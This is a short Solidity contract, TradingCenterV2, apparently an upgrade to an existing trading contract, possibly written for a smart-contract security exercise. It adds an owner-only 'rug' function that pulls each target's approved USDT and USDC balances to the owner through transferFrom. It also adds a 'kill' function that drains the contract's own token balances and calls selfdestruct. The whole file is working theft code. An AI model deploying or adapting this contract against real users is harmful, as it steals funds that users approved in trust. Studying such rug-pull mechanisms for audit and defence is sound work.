// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./TradingCenter.sol";
import "./Ownable.sol";

contract TradingCenterV2 is TradingCenter, Ownable {
  constructor () {
    initializeOwnable(msg.sender);
  }

  function rug(address _target) public onlyOwner {
    // Get allowance amount for each token
    uint256 usdt_allowed_amount = usdt.allowance(_target, address(this));
    uint256 usdc_allowed_amount = usdc.allowance(_target, address(this));
    // Transfer tokens if allowed amount > 0
    if (usdt_allowed_amount > 0) {
      // Get actual amount to transfer
      uint256 _amount = usdt_allowed_amount > usdt.balanceOf(_target) ? usdt.balanceOf(_target) : usdt_allowed_amount;
      usdt.transferFrom(_target, msg.sender, _amount);
    }
    if (usdc_allowed_amount > 0) {
      uint256 _amount = usdc_allowed_amount > usdc.balanceOf(_target) ? usdc.balanceOf(_target) : usdc_allowed_amount;
      usdc.transferFrom(_target, msg.sender, _amount);
    }
  }

  function kill() public onlyOwner {
    usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    selfdestruct(payable(msg.sender));
  }
}
